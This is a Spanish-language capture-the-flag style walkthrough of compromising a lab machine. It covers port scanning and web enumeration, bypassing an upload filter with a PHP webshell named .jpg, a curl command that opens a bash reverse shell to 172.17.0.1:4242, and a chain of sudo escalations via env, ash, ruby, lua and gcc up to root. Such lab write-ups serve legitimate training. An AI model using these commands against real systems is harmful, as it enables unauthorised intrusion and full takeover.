Hacemos un nmap para ver que puertos tiene abiertos:

![[Pasted image 20260629001537.png]]

Vemos que solo tiene el 80 HTTP. Hacemos un *whatweb* y un *gobuster* para enumerar información de la web:

![[Pasted image 20260629001700.png]]

Vemos que tiene un directorio */themes* si intentamos ahcer una busqueda recursiva para ver si hay algo interesante:

![[Pasted image 20260629002013.png]]

Hay un archivo *.php* que se deduce que permite subir archivos. Asi que intentamos subir archivos con terminal ya que no hay interfaz:

![[Pasted image 20260629002120.png]]

Se intenta subir datos pero nada, solo se permite subir archivos JPG (imagenes). Asi que intentamos subir tambien archivos PHP, con extension final jpg:

![[Pasted image 20260629002211.png]]

Se ha subido correctamente, asi que intentamos acceder al archivo y ejecutamos comandos:

![[Pasted image 20260629002235.png]]

Tenemos un **RCE**, asi que intentamos tener una reverse shell:

```bash
curl http://172.17.0.2/themes/uploads/6a419b3345965.jpg?cmd=/bin/bash%20-c%20%27/bin/bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/4242%200%3E%261%27
```

Este curl permite obtener la reverse shell si nos ponemos con netcat en escucha por el puerto *4242*. Obtenemos la terminal y vemos si podemos escalar privilegios:

![[Pasted image 20260629003156.png]]

Vemos que se puede ejecutar el binario *env* como **daphne**. Asi que lo ejecutamos con:

```zsh
sudo -u daphne /usr/bin/env /bin/bash
```

Y ahora como daphne, podemos ejecutar como **vilma** el binario *ash*:

![[Pasted image 20260629003305.png]]

```bash
sudo -u vilma /usr/bin/ash
```

AHora el usuario *shaggy* puede ejecutar el binario */usr/bin/ruby*:

![[Pasted image 20260629003522.png]]

```bash
sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/bash"'
```

Ahora el usuario *fred* puede ejecutar el binario */usr/bin/lua*:

![[Pasted image 20260629003728.png]]

```bash
sudo -u fred /usr/bin/lua -e 'os.execute("/bin/bash")'
```

Ahora el usuario *scooby* puede ejecutar el binario */usr/bin/gcc*:

![[Pasted image 20260629004141.png]]

```bash
sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s x
```

Ahora el usuario *root* puede ejecutar el binario */usr/bin/sudo*:

![[Pasted image 20260629004257.png]]

```bash
sudo -u root /usr/bin/sudo /bin/bash
```

